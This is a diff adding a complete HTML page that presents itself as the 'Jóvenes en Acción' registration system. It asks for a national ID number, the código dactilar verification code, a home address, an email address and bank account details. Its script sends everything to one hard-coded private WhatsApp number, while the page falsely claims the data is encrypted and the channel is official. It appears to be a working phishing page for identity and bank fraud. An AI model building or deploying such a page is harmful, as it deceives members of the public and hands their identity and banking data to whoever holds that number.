@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jóvenes en Acción - Registro WhatsApp</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0066cc;
+            --primary-dark: #004d99;
+            --secondary: #00a86b;
+            --accent: #ff6b35;
+            --gradient-1: linear-gradient(135deg, #0066cc 0%, #004d99 100%);
+            --gradient-2: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.1);
+            --shadow-md: 0 8px 24px rgba(0,0,0,0.15);
+            --shadow-lg: 0 16px 48px rgba(0,0,0,0.2);
+            --border-radius: 16px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 50%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 80%, rgba(255,255,255,0.15) 0%, transparent 50%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 0 32px 64px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.1);
+            width: 100%;
+            max-width: 560px;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+            animation: slideUp 0.6s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0066cc 0%, #004d99 100%);
+            padding: 40px 30px 30px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="rgba(255,255,255,0.05)" d="M0,160L48,176C96,192,192,224,288,229.3C384,235,480,213,576,192C672,171,768,149,864,154.7C960,160,1056,192,1152,197.3C1248,203,1344,181,1392,170.7L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>') no-repeat bottom;
+            background-size: cover;
+            opacity: 0.3;
+        }
+
+        .logo-container {
+            position: relative;
+            z-index: 1;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            background: white;
+            border-radius: 50%;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 45px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.05) rotate(5deg);
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            border: 3px solid rgba(255,255,255,0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.5; }
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.95;
+            font-weight: 300;
+            position: relative;
+            z-index: 1;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(10px);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 12px;
+            border: 1px solid rgba(255,255,255,0.3);
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-container {
+            padding: 35px 30px;
+            background: white;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e1e8ed;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-icon {
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2d3748;
+            font-weight: 500;
+            font-size: 13px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: #a0aec0;
+            z-index: 1;
+            transition: color 0.3s ease;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background: #f7fafc;
+            font-family: 'Poppins', sans-serif;
+            color: #2d3748;
+        }
+
+        select {
+            padding-left: 40px;
+            cursor: pointer;
+            appearance: none;
+            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%23a0aec0" viewBox="0 0 16 16"><path d="M8 11L3 6h10z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            padding-right: 40px;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: white;
+            box-shadow: 0 0 0 4px rgba(0,102,204,0.1);
+            transform: translateY(-1px);
+        }
+
+        input:focus + .input-icon,
+        input:focus ~ .input-icon {
+            color: var(--primary);
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .full-width {
+            grid-column: 1 / -1;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            font-family: 'Poppins', sans-serif;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(37, 211, 102, 0.3);
+        }
+
+        .btn-submit::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(37, 211, 102, 0.4);
+        }
+
+        .btn-submit:hover::before {
+            left: 100%;
+        }
+
+        .btn-submit:active {
+            transform: translateY(-1px);
+        }
+
+        .whatsapp-icon {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .whatsapp-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .alert {
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            display: none;
+            animation: slideDown 0.3s ease;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-10px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .alert-success {
+            background: #f0fff4;
+            color: #22543d;
+            border-left: 4px solid #48bb78;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .alert-error {
+            background: #fff5f5;
+            color: #742a2a;
+            border-left: 4px solid #fc8181;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #6c757d;
+            border-top: 1px solid #dee2e6;
+        }
+
+        .footer-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .row {
+                grid-template-columns: 1fr;
+            }
+            
+            .container {
+                margin: 10px;
+            }
+            
+            .form-container {
+                padding: 25px 20px;
+            }
+            
+            .header {
+                padding: 30px 20px 25px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+
+        /* Tooltip personalizado */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            margin-left: 6px;
+            cursor: help;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #2d3748;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -100px;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo">🎓</div>
+            </div>
+            <h1>Jóvenes en Acción</h1>
+            <p>Sistema de Registro Automatizado</p>
+            <div class="badge">🔒 Datos Seguros • Envío Instantáneo</div>
+        </div>
+
+        <div class="form-container">
+            <div id="alert" class="alert"></div>
+            
+            <form id="registroForm">
+                <!-- Sección Datos Personales -->
+                <div class="section-title">
+                    <span class="section-icon">👤</span>
+                    Datos Personales
+                </div>
+                
+                <div class="form-group">
+                    <label for="cedula">
+                        Cédula de Identidad
+                        <span class="tooltip">❓
+                            <span class="tooltiptext">Ingrese su número de cédula de 10 dígitos</span>
+                        </span>
+                    </label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📋</span>
+                        <input type="text" id="cedula" name="cedula" 
+                               placeholder="Ej: 1723456789" 
+                               required maxlength="10" pattern="[0-9]{10}"
+                               autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="codigoDactilar">
+                        Código Dactilar
+                        <span class="tooltip">❓
+                            <span class="tooltiptext">Código único de identificación dactilar</span>
+                        </span>
+                    </label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔢</span>
+                        <input type="text" id="codigoDactilar" name="codigoDactilar" 
+                               placeholder="Ingrese su código dactilar" required>
+                    </div>
+                </div>
+
+                <!-- Sección Dirección -->
+                <div class="section-title">
+                    <span class="section-icon">📍</span>
+                    Información de Dirección
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label for="provincia">Provincia</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">🏙️</span>
+                            <select id="provincia" name="provincia" required>
+                                <option value="">Seleccionar</option>
+                                <option value="Azuay">Azuay</option>
+                                <option value="Bolívar">Bolívar</option>
+                                <option value="Cañar">Cañar</option>
+                                <option value="Carchi">Carchi</option>
+                                <option value="Chimborazo">Chimborazo</option>
+                                <option value="Cotopaxi">Cotopaxi</option>
+                                <option value="El Oro">El Oro</option>
+                                <option value="Esmeraldas">Esmeraldas</option>
+                                <option value="Galápagos">Galápagos</option>
+                                <option value="Guayas">Guayas</option>
+                                <option value="Imbabura">Imbabura</option>
+                                <option value="Loja">Loja</option>
+                                <option value="Los Ríos">Los Ríos</option>
+                                <option value="Manabí">Manabí</option>
+                                <option value="Morona Santiago">Morona Santiago</option>
+                                <option value="Napo">Napo</option>
+                                <option value="Orellana">Orellana</option>
+                                <option value="Pastaza">Pastaza</option>
+                                <option value="Pichincha">Pichincha</option>
+                                <option value="Santa Elena">Santa Elena</option>
+                                <option value="Santo Domingo">Santo Domingo</option>
+                                <option value="Sucumbíos">Sucumbíos</option>
+                                <option value="Tungurahua">Tungurahua</option>
+                                <option value="Zamora Chinchipe">Zamora Chinchipe</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="canton">Cantón</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">🏘️</span>
+                            <input type="text" id="canton" name="canton" 
+                                   placeholder="Ingrese su cantón" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="direccion">Dirección Completa</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📍</span>
+                        <input type="text" id="direccion" name="direccion" 
+                               placeholder="Ej: Calle Principal 123 y Av. Central" required>
+                    </div>
+                </div>
+
+                <!-- Sección Contacto -->
+                <div class="section-title">
+                    <span class="section-icon">✉️</span>
+                    Información de Contacto
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Correo Electrónico</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📧</span>
+                        <input type="email" id="email" name="email" 
+                               placeholder="ejemplo@correo.com" required>
+                    </div>
+                </div>
+
+                <!-- Sección Datos Bancarios -->
+                <div class="section-title">
+                    <span class="section-icon">🏦</span>
+                    Información Bancaria
+                </div>
+
+                <div class="form-group">
+                    <label for="institucionFinanciera">Institución Financiera</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🏛️</span>
+                        <select id="institucionFinanciera" name="institucionFinanciera" required>
+                            <option value="">Seleccione institución</option>
+                            <option value="Banco Pichincha">Banco Pichincha</option>
+                            <option value="Banco Guayaquil">Banco Guayaquil</option>
+                            <option value="Banco del Pacífico">Banco del Pacífico</option>
+                            <option value="BanEcuador">BanEcuador</option>
+                            <option value="Banco Internacional">Banco Internacional</option>
+                            <option value="Produbanco">Produbanco</option>
+                            <option value="Cooperativa JEP">Cooperativa JEP</option>
+                            <option value="Cooperativa 29 de Octubre">Cooperativa 29 de Octubre</option>
+                            <option value="Cooperativa Andalucía">Cooperativa Andalucía</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label for="tipoCuenta">Tipo de Cuenta</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">💳</span>
+                            <select id="tipoCuenta" name="tipoCuenta" required>
+                                <option value="">Seleccionar</option>
+                                <option value="Ahorros">Ahorros</option>
+                                <option value="Corriente">Corriente</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="numeroCuenta">Número de Cuenta</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">🔢</span>
+                            <input type="text" id="numeroCuenta" name="numeroCuenta" 
+                                   placeholder="Número de cuenta" required>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    <span class="whatsapp-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                        </svg>
+                        Enviar Datos por WhatsApp
+                    </span>
+                </button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-item">🔒 Datos Encriptados</div>
+                <div class="footer-item">⚡ Envío Instantáneo</div>
+                <div class="footer-item">📱 WhatsApp Oficial</div>
+            </div>
+            <div style="margin-top: 8px;">© 2024 Jóvenes en Acción • Todos los derechos reservados</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('registroForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validar cédula
+            const cedula = document.getElementById('cedula').value;
+            if (cedula.length !== 10 || !/^\d+$/.test(cedula)) {
+                mostrarAlerta('❌ Por favor ingrese una cédula válida de 10 dígitos', 'error');
+                return;
+            }
+            
+            // Validar email
+            const email = document.getElementById('email').value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                mostrarAlerta('❌ Por favor ingrese un correo electrónico válido', 'error');
+                return;
+            }
+            
+            // Recopilar todos los datos
+            const datos = {
+                cedula: document.getElementById('cedula').value,
+                codigoDactilar: document.getElementById('codigoDactilar').value,
+                provincia: document.getElementById('provincia').value,
+                canton: document.getElementById('canton').value,
+                direccion: document.getElementById('direccion').value,
+                email: document.getElementById('email').value,
+                institucionFinanciera: document.getElementById('institucionFinanciera').value,
+                tipoCuenta: document.getElementById('tipoCuenta').value,
+                numeroCuenta: document.getElementById('numeroCuenta').value,
+                fecha: new Date().toLocaleDateString('es-EC', { 
+                    weekday: 'long', 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                }),
+                hora: new Date().toLocaleTimeString('es-EC', { 
+                    hour: '2-digit', 
+                    minute: '2-digit' 
+                })
+            };
+            
+            // Crear mensaje para WhatsApp con formato mejorado
+            const mensaje = `🌟 *NUEVO REGISTRO - JÓVENES EN ACCIÓN* 🌟
+        
+        📅 *Fecha:* ${datos.fecha}
+        ⏰ *Hora:* ${datos.hora}
+        
+        ━━━━━━━━━━━━━━━━━━━━━
+        👤 *DATOS PERSONALES*
+        ━━━━━━━━━━━━━━━━━━━━━
+        📋 Cédula: ${datos.cedula}
+        🔢 Código Dactilar: ${datos.codigoDactilar}
+        
+        ━━━━━━━━━━━━━━━━━━━━━
+        📍 *DIRECCIÓN*
+        ━━━━━━━━━━━━━━━━━━━━━
+        🏙️ Provincia: ${datos.provincia}
+        🏘️ Cantón: ${datos.canton}
+        📍 Dirección: ${datos.direccion}
+        
+        ━━━━━━━━━━━━━━━━━━━━━
+        📧 *CONTACTO*
+        ━━━━━━━━━━━━━━━━━━━━━
+        ✉️ Email: ${datos.email}
+        
+        ━━━━━━━━━━━━━━━━━━━━━
+        💰 *DATOS BANCARIOS*
+        ━━━━━━━━━━━━━━━━━━━━━
+        🏦 Institución: ${datos.institucionFinanciera}
+        💳 Tipo de Cuenta: ${datos.tipoCuenta}
+        🔢 Número de Cuenta: ${datos.numeroCuenta}
+        
+        ━━━━━━━━━━━━━━━━━━━━━
+        ✅ *REGISTRO COMPLETADO*
+        📱 Enviado desde el sistema automatizado`;
+            
+            // Codificar mensaje para URL
+            const mensajeCodificado = encodeURIComponent(mensaje);
+            
+            // Número de WhatsApp (Ecuador)
+            const numeroWhatsApp = '5930963023351';
+            
+            // Crear enlace de WhatsApp
+            const urlWhatsApp = `https://wa.me/${numeroWhatsApp}?text=${mensajeCodificado}`;
+            
+            // Mostrar alerta de éxito
+            mostrarAlerta('✅ ¡Datos procesados correctamente! Abriendo WhatsApp en unos segundos...', 'success');
+            
+            // Efecto de carga en el botón
+            const btn = document.querySelector('.btn-submit');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '⏳ Preparando envío...';
+            btn.style.pointerEvents = 'none';
+            
+            // Abrir WhatsApp en nueva ventana
+            setTimeout(() => {
+                window.open(urlWhatsApp, '_blank');
+                btn.innerHTML = originalText;
+                btn.style.pointerEvents = 'auto';
+                
+                // Limpiar formulario
+                document.getElementById('registroForm').reset();
+                document.getElementById('alert').style.display = 'none';
+            }, 2000);
+        });
+        
+        function mostrarAlerta(mensaje, tipo) {
+            const alert = document.getElementById('alert');
+            alert.innerHTML = mensaje;
+            alert.className = `alert alert-${tipo}`;
+            alert.style.display = 'flex';
+            
+            // Auto-ocultar después de 6 segundos
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 6000);
+        }
+        
+        // Validación en tiempo real de cédula
+        document.getElementById('cedula').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 10);
+            
+            // Feedback visual
+            if (this.value.length === 10) {
+                this.style.borderColor = '#48bb78';
+            } else {
+                this.style.borderColor = '#e2e8f0';
+            }
+        });
+        
+        // Validación de número de cuenta
+        document.getElementById('numeroCuenta').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+        
+        // Animación suave al hacer scroll
+        document.querySelectorAll('input, select').forEach(element => {
+            element.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+            });
+            
+            element.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+        
+        // Prevenir envío con Enter en campos individuales
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    // Enfocar el siguiente campo
+                    const inputs = Array.from(document.querySelectorAll('input, select'));
+                    const index = inputs.indexOf(this);
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
